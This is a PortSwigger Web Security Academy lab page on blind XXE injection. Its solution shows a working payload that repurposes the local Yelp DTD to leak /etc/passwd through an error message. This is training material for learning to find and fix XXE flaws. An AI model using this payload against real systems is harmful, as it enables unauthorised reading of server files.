# Lab: Exploiting XXE to retrieve data by repurposing a local DTD

Source: https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd
Fetched: 2026-06-28T09:18:06.431255+00:00

Web Security Academy

XXE injection

Blind

Lab

Lab: Exploiting XXE to retrieve data by repurposing a local DTD

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, trigger an error message containing the contents of the /etc/passwd file.

You'll need to reference an existing DTD file on the server and redefine an entity from it.

Hint

Systems using the GNOME desktop environment often have a DTD at /usr/share/yelp/dtd/docbookx.dtd containing an entity called ISOamso.

Solution

Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.

Insert the following parameter entity definition in between the XML declaration and the stockCheck element:

<!DOCTYPE message [

<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">

<!ENTITY % ISOamso '

<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">

<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">

&#x25;eval;

&#x25;error;

'>

%local_dtd;

]>

This will import the Yelp DTD, then redefine the ISOamso entity, triggering an error message containing the contents of the /etc/passwd file.

Community solutions

Garr_7

Michael Sommer (no audio)

Find XSS vulnerabilities using Burp Suite

Try for free
